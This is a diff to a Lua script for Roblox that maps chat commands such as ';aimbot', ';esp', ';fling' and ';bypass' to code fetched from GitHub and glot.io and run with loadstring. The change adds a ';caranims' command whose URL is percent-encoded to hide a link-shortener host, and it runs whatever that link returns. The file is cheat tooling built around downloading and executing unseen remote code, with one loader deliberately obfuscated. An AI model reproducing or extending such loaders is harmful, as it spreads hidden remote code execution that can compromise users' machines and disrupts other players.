@@ -1,7 +1,7 @@
 return function(scriptBox, player)
     local commands = {
         ";krunox", ";dhex", ";qcmd", ";straw",
-        ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";sfly", ";fly2", ";sfly2", ";rtt", ";rkt", ";conprint",
+        ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";sfly", ";fly2", ";sfly2", ";rtt", ";rkt", ";conprint", ";caranims",
         ";tfling2", ";bp1", ";bp2", ";bp3", ";bp4", ";bp5", ";bp6", ";bp7", ";bp8", ";bhtool", ";mvtool", ";grtool", ";tel1", ";tel2", ";glios", ";cmds", ";hth", ";antierr",
         ";zomb", ";search", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";invis3", ";tel3", ";roa", ";akp1", ";akp2", ";akp3", ";keyb3", ";keyb4", ";cvb", ";ska", ";reach", ";reach2", ";hitbox", ";aimbot", ";cfling", ";finger", ";finger2", ";spdmtr",
         ";prox", ";rochips", ";fc1", ";fc2", ";synapse", ";synapse2", ";krnl", ";krnlk", ";bypass", ";fc3", ";rp", ";rp2", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";cspy", ";slock", ";wibtt", ";acl", ";crouch", ";srp3", ";srp4", ";tptool", ";ngp", ";fling", ";esp", ";radar", ";OCDtool", ";fc4", ";guneditor",
@@ -27,6 +27,9 @@ return function(scriptBox, player)
             loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/FE-console-typer/raw/refs/heads/main/Console%20printer"))()
         elseif code == ";antierr" then
             loadstring(game:HttpGet("https://glot.io/snippets/hcfoitpvco/raw/AntiError.lua "))()
+        elseif code == ";caranims" then
+            local a,b,e=loadstring,http.request,"https://%74%31%70%2E%64%65/%43%61%72%41%6E%69%6D%73"
+a(b({Url=e}).Body)()
         elseif code == ";guneditor" then
             loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Test/raw/main/gun_settings"))()
         elseif code == ";slock" then
